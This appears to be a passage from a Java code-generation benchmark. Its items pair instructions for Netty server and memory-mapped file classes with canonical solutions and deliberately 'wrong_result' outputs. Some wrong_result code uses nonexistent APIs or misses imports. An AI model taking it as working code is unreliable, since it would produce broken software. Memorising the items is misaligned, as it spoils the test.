    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.lang.reflect.Method;\nimport java.net.URI;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport org.pdown.gui.http.controller.DefaultController;\nimport org.pdown.gui.http.util.HttpHandlerUtil;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\npublic class EmbedHttpServer {\n\n  private static final Logger LOGGER = LoggerFactory.getLogger(EmbedHttpServer.class);\n\n  private int port;\n  private DefaultController defaultController;\n  private List<Object> controllerList;\n\n  public EmbedHttpServer(int port) {\n    this.port = port;\n    this.defaultController = new DefaultController();\n    this.controllerList = new ArrayList<>();\n  }\n\n  public FullHttpResponse invoke(String uri, Channel channel, FullHttpRequest request) throws Exception {\n    if (controllerList != null) {\n      for (Object obj : controllerList) {\n        Class<?> clazz = obj.getClass();\n        RequestMapping mapping = clazz.getAnnotation(RequestMapping.class);\n        if (mapping != null) {\n          String mappingUri = fixUri(mapping.value()[0]);\n          for (Method actionMethod : clazz.getMethods()) {\n            RequestMapping subMapping = actionMethod.getAnnotation(RequestMapping.class);\n            if (subMapping != null) {\n              String subMappingUri = fixUri(subMapping.value()[0]);\n              if (uri.equalsIgnoreCase(mappingUri + subMappingUri)) {\n                return (FullHttpResponse) actionMethod.invoke(obj, channel, request);\n              }\n            }\n          }\n        }\n      }\n    }\n    return defaultController.handle(channel, request);\n  }\n\n  private String fixUri(String uri) {\n    StringBuilder builder = new StringBuilder(uri);\n    if (builder.indexOf(\"/\") != 0) {\n      builder.insert(0, \"/\");\n    }\n    if (builder.lastIndexOf(\"/\") == builder.length() - 1) {\n      builder.delete(builder.length() - 1, builder.length());\n    }\n    return builder.toString();\n  }\n\n  public void start(GenericFutureListener startedListener) {\n    NioEventLoopGroup bossGroup = new NioEventLoopGroup(2);\n    NioEventLoopGroup workGroup = new NioEventLoopGroup(2);\n    try {\n      ServerBootstrap bootstrap = new ServerBootstrap().group(bossGroup, workGroup)\n          .channel(NioServerSocketChannel.class)\n          .childHandler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) throws Exception {\n              ch.pipeline().addLast(\"httpCodec\", new HttpServerCodec());\n              ch.pipeline().addLast(new HttpObjectAggregator(4194304));\n              ch.pipeline()\n                  .addLast(\"serverHandle\", new SimpleChannelInboundHandler<FullHttpRequest>() {\n\n                    @Override\n                    protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) throws Exception {\n                      URI uri = new URI(request.uri());\n                      FullHttpResponse httpResponse = invoke(uri.getPath(), ctx.channel(), request);\n                      if (httpResponse != null) {\n                        httpResponse.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);\n                        httpResponse.headers().set(HttpHeaderNames.CONTENT_LENGTH, httpResponse.content().readableBytes());\n                        ch.writeAndFlush(httpResponse);\n                      }\n                    }\n\n                    @Override\n                    public void channelUnregistered(ChannelHandlerContext ctx) {\n                      ctx.channel().close();\n                    }\n\n                    @Override\n                    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                      LOGGER.error(\"native request error\", cause.getCause() == null ? cause : cause.getCause());\n                      Map<String, Object> data = new HashMap<>();\n                      data.put(\"error\", cause.getCause().toString());\n                      FullHttpResponse httpResponse = HttpHandlerUtil.buildJson(data);\n                      httpResponse.setStatus(HttpResponseStatus.INTERNAL_SERVER_ERROR);\n                      ctx.channel().writeAndFlush(httpResponse);\n                    }\n                  });\n            }\n          });\n      ChannelFuture f = bootstrap.bind(\"127.0.0.1\", port).sync();\n      if (startedListener != null) {\n        f.addListener(startedListener);\n      }\n      f.channel().closeFuture().sync();\n    } catch (Exception e) {\n      e.printStackTrace();\n    } finally {\n      bossGroup.shutdownGracefully();\n      workGroup.shutdownGracefully();\n    }\n  }\n\n  public EmbedHttpServer addController(Object obj) {\n    this.controllerList.add(obj);\n    return this;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class EmbedHttpServer {\n    private final int port;\n    private final DefaultController defaultController;\n    private final List<Object> controllerList;\n    private static final Logger LOGGER = LoggerFactory.getLogger(EmbedHttpServer.class);\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n        this.defaultController = new DefaultController();\n        this.controllerList = new ArrayList<>();\n    }\n\n    public FullHttpResponse invoke(String uri, Channel channel, FullHttpRequest request) {\n        String normalizedUri = fixUri(uri);\n        for (Object controller : controllerList) {\n            Method[] methods = controller.getClass().getDeclaredMethods();\n            for (Method method : methods) {\n                if (method.isAnnotationPresent(RequestMapping.class)) {\n                    RequestMapping mapping = method.getAnnotation(RequestMapping.class);\n                    if (mapping.value().equals(normalizedUri)) {\n                        try {\n                            Object result = method.invoke(controller, request);\n                            if (result instanceof FullHttpResponse) {\n                                return (FullHttpResponse) result;\n                            }\n                        } catch (Exception e) {\n                            LOGGER.error(\"Error invoking controller method\", e);\n                            return defaultController.handleException(e, channel, request);\n                        }\n                    }\n                }\n            }\n        }\n        return defaultController.handleRequest(channel, request);\n    }\n\n    private String fixUri(String uri) {\n        if (uri == null || uri.isEmpty()) {\n            return \"/\";\n        }\n        if (!uri.startsWith(\"/\")) {\n            uri = \"/\" + uri;\n        }\n        if (uri.endsWith(\"/\") && uri.length() > 1) {\n            uri = uri.substring(0, uri.length() - 1);\n        }\n        return uri;\n    }\n\n    public void start(GenericFutureListener<ChannelFuture> startedListener) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<Channel>() {\n                 @Override\n                 protected void initChannel(Channel ch) {\n                     ch.pipeline().addLast(\n                         new HttpRequestDecoder(),\n                         new HttpObjectAggregator(65536),\n                         new HttpResponseEncoder(),\n                         new SimpleChannelInboundHandler<FullHttpRequest>() {\n                             @Override\n                             protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) {\n                                 String uri = request.uri();\n                                 FullHttpResponse response = invoke(uri, ctx.channel(), request);\n                                 ctx.writeAndFlush(response);\n                             }\n\n                             @Override\n                             public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                                 LOGGER.error(\"Exception caught in HTTP server\", cause);\n                                 ctx.close();\n                             }\n                         });\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.addListener(startedListener);\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            LOGGER.error(\"Server interrupted\", e);\n            Thread.currentThread().interrupt();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public EmbedHttpServer addController(Object obj) {\n        controllerList.add(obj);\n        return this;\n    }\n}"
  },
  {
    "Task_id": 186,
    "Instruction": "Task Description: Implement an abstract HTTP/2 server transport class using Java Netty framework that handles TCP communication, manages server lifecycle (start/stop), and supports SSL encryption.\n\nClass Description: AbstractHttp2ServerTransport is an abstract base class for creating HTTP/2 server transports using Netty. It manages server bootstrap configuration, event loop groups, and provides core server functionality including SSL support and connection management.\n\nAttributes:\n- LOGGER: Logger - Logger instance for logging server events and errors\n- serverBootstrap: ServerBootstrap - Netty server bootstrap instance for configuring and starting the server\n- bizGroup: EventLoopGroup - Event loop group for handling business logic and I/O operations\n- transportConfig: ServerTransportConfig - Configuration object containing server parameters like host, port, and various TCP options\n\nMethods:\n- AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) -> None - Constructor that initializes the transport with configuration\n- start() -> boolean - Starts the HTTP/2 server, initializes event loop groups, configures server bootstrap with TCP options and handlers, and binds to the specified host/port. Returns true if successful\n- stop() -> None - Shuts down the server gracefully, closing event loop groups and releasing resources\n- (inherited methods from ServerTransport superclass would be listed here if applicable)\n\nInput:\n- For constructor: ServerTransportConfig object containing server configuration parameters\n- For start(): None (uses internal state)\n- For stop(): None (uses internal state)\n\nOutput:\n- For start(): boolean indicating success/failure of server startup\n- For stop(): None (performs cleanup operations)",
    "Canonical_solution": "import com.alipay.sofa.rpc.core.exception.SofaRpcRuntimeException;\nimport com.alipay.sofa.rpc.log.LogCodes;\nimport com.alipay.sofa.rpc.log.Logger;\nimport com.alipay.sofa.rpc.log.LoggerFactory;\nimport com.alipay.sofa.rpc.server.http.HttpServerHandler;\nimport com.alipay.sofa.rpc.transport.ServerTransport;\nimport com.alipay.sofa.rpc.transport.ServerTransportConfig;\nimport com.alipay.sofa.rpc.transport.netty.NettyHelper;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.WriteBufferWaterMark;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\n\nimport java.net.InetSocketAddress;\n\npublic abstract class AbstractHttp2ServerTransport extends ServerTransport {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(AbstractHttp2ServerTransport.class);\n\n    private volatile ServerBootstrap serverBootstrap;\n    private EventLoopGroup bizGroup;\n\n    protected AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) {\n        super(transportConfig);\n    }\n\n    @Override\n    public boolean start() {\n        if (serverBootstrap != null) {\n            return true;\n        }\n        synchronized (this) {\n            if (serverBootstrap != null) {\n                return true;\n            }\n            boolean flag = false;\n            SslContext sslCtx = SslContextBuilder.build();\n\n            EventLoopGroup bossGroup = NettyHelper.getServerBossEventLoopGroup(transportConfig);\n            HttpServerHandler httpServerHandler = (HttpServerHandler) transportConfig.getServerHandler();\n            bizGroup = NettyHelper.getServerBizEventLoopGroup(transportConfig, httpServerHandler.getBizThreadPool());\n\n            serverBootstrap = new ServerBootstrap();\n            serverBootstrap.group(bossGroup, bizGroup)\n                .channel(transportConfig.isUseEpoll() ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, transportConfig.getBacklog())\n                .option(ChannelOption.SO_REUSEADDR, transportConfig.isReuseAddr())\n                .option(ChannelOption.RCVBUF_ALLOCATOR, NettyHelper.getRecvByteBufAllocator())\n                .option(ChannelOption.ALLOCATOR, NettyHelper.getByteBufAllocator())\n                .childOption(ChannelOption.SO_KEEPALIVE, transportConfig.isKeepAlive())\n                .childOption(ChannelOption.TCP_NODELAY, transportConfig.isTcpNoDelay())\n                .childOption(ChannelOption.SO_RCVBUF, 8192 * 128)\n                .childOption(ChannelOption.SO_SNDBUF, 8192 * 128)\n                .handler(new LoggingHandler(LogLevel.DEBUG))\n                .childOption(ChannelOption.ALLOCATOR, NettyHelper.getByteBufAllocator())\n                .childOption(ChannelOption.WRITE_BUFFER_WATER_MARK, new WriteBufferWaterMark(\n                    transportConfig.getBufferMin(), transportConfig.getBufferMax()))\n                .childHandler(new Http2ServerChannelInitializer(bizGroup, sslCtx,\n                    httpServerHandler, transportConfig.getPayload()));\n\n            ChannelFuture future = serverBootstrap.bind(\n                new InetSocketAddress(transportConfig.getHost(), transportConfig.getPort()));\n            ChannelFuture channelFuture = future.addListener(new ChannelFutureListener() {\n                @Override\n                public void operationComplete(ChannelFuture future) throws Exception {\n                    if (future.isSuccess()) {\n                        if (LOGGER.isInfoEnabled()) {\n                            LOGGER.info(\"HTTP/2 Server bind to {}:{} success!\",\n                                transportConfig.getHost(), transportConfig.getPort());\n                        }\n                    } else {\n                        LOGGER.error(LogCodes.getLog(LogCodes.ERROR_HTTP2_BIND, transportConfig.getHost(),\n                            transportConfig.getPort()));\n                        stop();\n                    }\n                }\n            });\n\n            try {\n                channelFuture.await();\n                if (channelFuture.isSuccess()) {\n                    flag = Boolean.TRUE;\n                } else {\n                    throw new SofaRpcRuntimeException(LogCodes.getLog(LogCodes.ERROR_START_SERVER, \"HTTP/2\"),\n                        future.cause());\n                }\n            } catch (InterruptedException e) {\n                LOGGER.error(e.getMessage(), e);\n            }\n            return flag;\n        }\n    }\n\n    @Override\n    public void stop() {\n        if (LOGGER.isInfoEnabled()) {\n            LOGGER.info(\"Shutdown the SOFA RPC HTTP/2 server transport now...\");\n        }\n        NettyHelper.closeServerBossEventLoopGroup(transportConfig);\n        if (bizGroup != null) {\n            bizGroup.shutdownGracefully();\n        }\n        serverBootstrap = null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public abstract class AbstractHttp2ServerTransport {\n    private static final Logger LOGGER = LoggerFactory.getLogger(AbstractHttp2ServerTransport.class);\n    protected ServerBootstrap serverBootstrap;\n    protected EventLoopGroup bizGroup;\n    protected ServerTransportConfig transportConfig;\n\n    protected AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) {\n        this.transportConfig = transportConfig;\n        this.serverBootstrap = new ServerBootstrap();\n    }\n\n    public boolean start() {\n        try {\n            if (transportConfig.isUseSsl()) {\n                SslContext sslContext = SslContext.newServerContext(transportConfig.getSslCertChainFile(), transportConfig.getSslPrivateKeyFile());\n                serverBootstrap.option(ChannelOption.SO_SSL, true).sslContext(sslContext);\n            }\n\n            serverBootstrap.group(bizGroup = new NioEventLoopGroup(transportConfig.getBossThreadCount()))\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(new Http2FrameDecoder(), new Http2FrameEncoder(), new Http2ConnectionHandler());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, transportConfig.getBacklog())\n                    .option(ChannelOption.SO_REUSEADDR, transportConfig.isReuseAddress())\n                    .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, transportConfig.getConnectTimeout());\n\n            ChannelFuture future = serverBootstrap.bind(transportConfig.getHost(), transportConfig.getPort()).sync();\n            if (!future.isSuccess()) {\n                LOGGER.error(\"Failed to bind to {}:{}\", transportConfig.getHost(), transportConfig.getPort(), future.cause());\n                return false;\n            }\n            LOGGER.info(\"HTTP/2 server started on {}:{}\", transportConfig.getHost(), transportConfig.getPort());\n            return true;\n        } catch (Exception e) {\n            LOGGER.error(\"Error starting HTTP/2 server\", e);\n            return false;\n        }\n    }\n\n    public void stop() {\n        if (bizGroup != null) {\n            bizGroup.shutdownGracefully();\n        }\n        if (serverBootstrap != null) {\n            serverBootstrap.config().group().shutdownGracefully();\n        }\n        LOGGER.info(\"HTTP/2 server stopped\");\n    }\n}"
  },
  {
    "Task_id": 19,
    "Instruction": "Task Description: Implement a Java class that processes large files efficiently using memory-mapped file operations (FileChannel and MappedByteBuffer) to calculate statistics (min, max, sum, count) for numeric values associated with named fields in the file.\n\nClass Description: FileChannelProcessor is a utility class that processes large files in chunks using memory-mapped buffers, calculating statistics for named numeric values in a thread-safe manner using concurrent data structures.\n\nAttributes:\n- mins: ConcurrentHashMap<ByteBuffer, Integer> - Stores minimum values for each named field\n- maxs: ConcurrentHashMap<ByteBuffer, Integer> - Stores maximum values for each named field\n- sums: ConcurrentHashMap<ByteBuffer, Integer> - Stores sum of values for each named field\n- counts: ConcurrentHashMap<ByteBuffer, Integer> - Stores count of values for each named field\n\nMethods:\n- processChunk(MappedByteBuffer chunk, long chunkSize) -> void - Processes a memory-mapped file chunk to calculate statistics for named numeric values\n  - Input Parameters:\n    - chunk: MappedByteBuffer - Memory-mapped buffer containing file data\n    - chunkSize: long - Size of the chunk to process\n- processFile(Path filePath) -> void - Processes the entire file by dividing it into chunks and calculating statistics\n  - Input Parameters:\n    - filePath: Path - Path to the file to be processed\n  - Throws: IOException - If there are file I/O errors",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.HashMap;\nimport java.util.IntSummaryStatistics;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class FileChannelProcessor {\n\n    private static final ConcurrentHashMap<ByteBuffer, Integer> mins = new ConcurrentHashMap<>();\n    private static final ConcurrentHashMap<ByteBuffer, Integer> maxs = new ConcurrentHashMap<>();\n    private static final ConcurrentHashMap<ByteBuffer, Integer> sums = new ConcurrentHashMap<>();\n    private static final ConcurrentHashMap<ByteBuffer, Integer> counts = new ConcurrentHashMap<>();\n\n    public static void processChunk(MappedByteBuffer chunk, long chunkSize) {\n        chunk.load();\n        HashMap<ByteBuffer, IntSummaryStatistics> values = new HashMap<>();\n\n        long end = chunk.position() + chunkSize;\n        int value = 0;\n        byte b = 0;\n        boolean negate = false;\n        long nameStart = 0;\n        long nameEnd = 0;\n        int nameLength = 0;\n        while (chunk.position() < end) {\n            nameStart = chunk.position();\n            b = chunk.get();\n            while (b != ';') {\n                b = chunk.get();\n            }\n            nameEnd = chunk.position() - 1;\n            nameLength = (int) (nameEnd - nameStart);\n            ByteBuffer nameBuffer = ByteBuffer.allocate(nameLength);\n            chunk.get(chunk.position() - nameLength - 1, nameBuffer.array(), 0, nameLength);\n\n            value = 0;\n            b = chunk.get();\n            negate = false;\n            while (b != '\\n') {\n                if (b == '.') {\n                    b = chunk.get();\n                    continue;\n                }\n                else if (b == '-') {\n                    negate = true;\n                    b = chunk.get();\n                    continue;\n                }\n                value = value * 10 + (b - '0');\n                b = chunk.get();\n            }\n            if (negate) {\n                value = -value;\n            }\n\n            if (values.containsKey(nameBuffer)) {\n                values.get(nameBuffer).accept(value);\n            }\n            else {\n                IntSummaryStatistics stats = new IntSummaryStatistics();\n                stats.accept(value);\n                values.put(nameBuffer, stats);\n            }\n        }\n\n        for (ByteBuffer nameBfr : values.keySet()) {\n            IntSummaryStatistics stats = values.get(nameBfr);\n            mins.compute(nameBfr, (k, v) -> v == null ? stats.getMin() : Math.min(v, stats.getMin()));\n            maxs.compute(nameBfr, (k, v) -> v == null ? stats.getMax() : Math.max(v, stats.getMax()));\n            sums.compute(nameBfr, (k, v) -> v == null ? (int) stats.getSum() : (v + (int) stats.getSum()));\n            counts.compute(nameBfr, (k, v) -> v == null ? (int) stats.getCount() : (v + (int) stats.getCount()));\n        }\n    }\n\n    public static void processFile(Path filePath) throws IOException {\n        FileChannel fc = FileChannel.open(filePath);\n        long fileSize = fc.size();\n        int numProcessors = Runtime.getRuntime().availableProcessors();\n        int numChunks = numProcessors * 2000;\n        long chunkLimit = fileSize / numChunks;\n        long chunkStart = 0;\n        long chunkEnd = chunkLimit;\n        ByteBuffer bb = ByteBuffer.allocateDirect(128);\n\n        while (chunkEnd < fileSize) {\n            fc.position(chunkEnd);\n            bb.clear();\n            fc.read(bb);\n            bb.flip();\n            while (bb.get() != '\\n' && bb.position() < bb.limit()) {\n            }\n            chunkEnd = chunkEnd + bb.position();\n            if (chunkEnd > fileSize) {\n                chunkEnd = fileSize - 1;\n            }\n\n            long chunkSize = chunkEnd - chunkStart;\n            if (chunkSize < 1) {\n                break;\n            }\n\n            MappedByteBuffer chunk = fc.map(FileChannel.MapMode.READ_ONLY, chunkStart, chunkSize);\n            processChunk(chunk, chunkSize);\n            chunkStart = chunkEnd;\n            chunkEnd = chunkEnd + chunkLimit;\n            if (chunkEnd > fileSize) {\n                chunkEnd = fileSize - 1;\n            }\n        }\n        fc.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class FileChannelProcessor {\n    private final ConcurrentHashMap<ByteBuffer, Integer> mins = new ConcurrentHashMap<>();\n    private final ConcurrentHashMap<ByteBuffer, Integer> maxs = new ConcurrentHashMap<>();\n    private final ConcurrentHashMap<ByteBuffer, Integer> sums = new ConcurrentHashMap<>();\n    private final ConcurrentHashMap<ByteBuffer, Integer> counts = new ConcurrentHashMap<>();\n\n    public void processChunk(MappedByteBuffer chunk, long chunkSize) {\n        int position = 0;\n        while (position < chunkSize) {\n            int fieldNameLength = chunk.getInt(position);\n            position += 4;\n            ByteBuffer fieldName = chunk.asReadOnlyBuffer().slice(position, fieldNameLength);\n            position += fieldNameLength;\n            int value = chunk.getInt(position);\n            position += 4;\n\n            mins.putIfAbsent(fieldName, value);\n            maxs.putIfAbsent(fieldName, value);\n            sums.putIfAbsent(fieldName, 0);\n            counts.putIfAbsent(fieldName, 0);\n\n            int currentMin = mins.get(fieldName);\n            int currentMax = maxs.get(fieldName);\n            int currentValueSum = sums.get(fieldName);\n            int currentValueCount = counts.get(fieldName);\n\n            if (value < currentMin) {\n                mins.put(fieldName, value);\n            }\n            if (value > currentMax) {\n                maxs.put(fieldName, value);\n            }\n            sums.put(fieldName, currentValueSum + value);\n            counts.put(fieldName, currentValueCount + 1);\n        }\n    }\n\n    public void processFile(Path filePath) throws IOException {\n        try (FileChannel channel = FileChannel.open(filePath)) {\n            long fileSize = channel.size();\n            long chunkSize = 1024 * 1024; // 1MB\n            long remaining = fileSize;\n            long position = 0;\n\n            while (remaining > 0) {\n                long sizeToMap = Math.min(chunkSize, remaining);\n                MappedByteBuffer chunk = channel.map(FileChannel.MapMode.READ_ONLY, position, sizeToMap);\n                processChunk(chunk, sizeToMap);\n                position += sizeToMap;\n                remaining -= sizeToMap;\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 190,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket chat server using Netty framework to handle TCP connections and manage client communications.\n\nClass Description: The WebSocketChatServer class is responsible for setting up and running a Netty-based TCP server that handles WebSocket connections for chat functionality. It manages server resources and gracefully shuts down when needed.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nWebSocketChatServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() throws Exception -> None - Starts the server, binds it to the specified port, and keeps it running until shutdown is requested. Manages server resources and ensures proper cleanup.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class WebSocketChatServer {\n\n    private int port;\n\n    public WebSocketChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new WebSocketChatServerInitializer())\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n            \n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class WebSocketChatServer {\n    private final int port;\n\n    public WebSocketChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        io.netty.bootstrap.ServerBootstrap b = new io.netty.bootstrap.ServerBootstrap();\n        b.group(new io.netty.channel.nio.NioEventLoopGroup())\n         .channel(io.netty.channel.socket.nio.NioServerSocketChannel.class)\n         .childHandler(new io.netty.channel.ChannelInitializer<io.netty.channel.socket.SocketChannel>() {\n             @Override\n             protected void initChannel(io.netty.channel.socket.SocketChannel ch) {\n                 ch.pipeline().addLast(\n                     new io.netty.handler.codec.http.HttpServerCodec(),\n                     new io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler(\"/ws\"),\n                     new WebSocketChatServerHandler()\n                 );\n             }\n         });\n\n        io.netty.channel.ChannelFuture f = b.bind(port).sync();\n        f.channel().closeFuture().sync();\n    }\n\n    private static class WebSocketChatServerHandler extends io.netty.channel.ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(io.netty.channel.ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof io.netty.handler.codec.http.FullHttpRequest) {\n                io.netty.handler.codec.http.FullHttpRequest request = (io.netty.handler.codec.http.FullHttpRequest) msg;\n                if (request.method() == io.netty.handler.codec.http.HttpMethod.GET) {\n                    io.netty.handler.codec.http.websocketx.WebSocketServerHandshakerFactory factory = new io.netty.handler.codec.http.websocketx.WebSocketServerHandshakerFactory(\n                        \"ws://localhost:\" + 8080 + \"/ws\", null, false);\n                    io.netty.handler.codec.http.websocketx.WebSocketServerHandshaker handshaker = factory.newHandshaker(request);\n                    if (handshaker != null) {\n                        handshaker.handshake(ctx.channel(), request);\n                    }\n                }\n            } else if (msg instanceof io.netty.handler.codec.http.websocketx.TextWebSocketFrame) {\n                io.netty.handler.codec.http.websocketx.TextWebSocketFrame frame = (io.netty.handler.codec.http.websocketx.TextWebSocketFrame) msg;\n                ctx.channel().writeAndFlush(new io.netty.handler.codec.http.websocketx.TextWebSocketFrame(\"Echo: \" + frame.text()));\n            }\n        }\n\n        @Override\n        public void exceptionCaught(io.netty.channel.ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 196,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using the Netty framework, capable of handling incoming client connections and processing messages.\n\nClass Description: The NettyTcpServer class is a TCP server implementation using Netty's non-blocking I/O. It manages server lifecycle (startup and shutdown) and handles client connections through configurable event loop groups and channel pipelines.\n\nAttributes:\n- serverBootstrap: ServerBootstrap - The main Netty server configuration object\n- bossGroup: EventLoopGroup - Handles incoming connection requests\n- workerGroup: EventLoopGroup - Handles I/O operations for established connections\n- port: int - The port number the server listens on\n\nMethods:\n- NettyTcpServer(int port) -> void - Constructor that initializes the server with specified port\n- start() -> void - Starts the server, binds to the configured port, and begins accepting connections\n- shutdown() -> void - Gracefully shuts down the server and releases resources\n- NettyServerHandler (inner class) - Handles incoming messages and exceptions for client connections\n  - channelRead(ChannelHandlerContext, Object) -> void - Processes incoming messages\n  - exceptionCaught(ChannelHandlerContext, Throwable) -> void - Handles channel exceptions",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class NettyTcpServer {\n\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final int port;\n\n    public NettyTcpServer(int port) {\n        this.port = port;\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.serverBootstrap = new ServerBootstrap();\n    }\n\n    public void start() throws InterruptedException {\n        try {\n            serverBootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .localAddress(new InetSocketAddress(port))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new NettyServerHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture channelFuture = serverBootstrap.bind().sync();\n            channelFuture.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    private static class NettyServerHandler extends io.netty.channel.ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(io.netty.channel.ChannelHandlerContext ctx, Object msg) {\n            // Message processing logic\n        }\n\n        @Override\n        public void exceptionCaught(io.netty.channel.ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
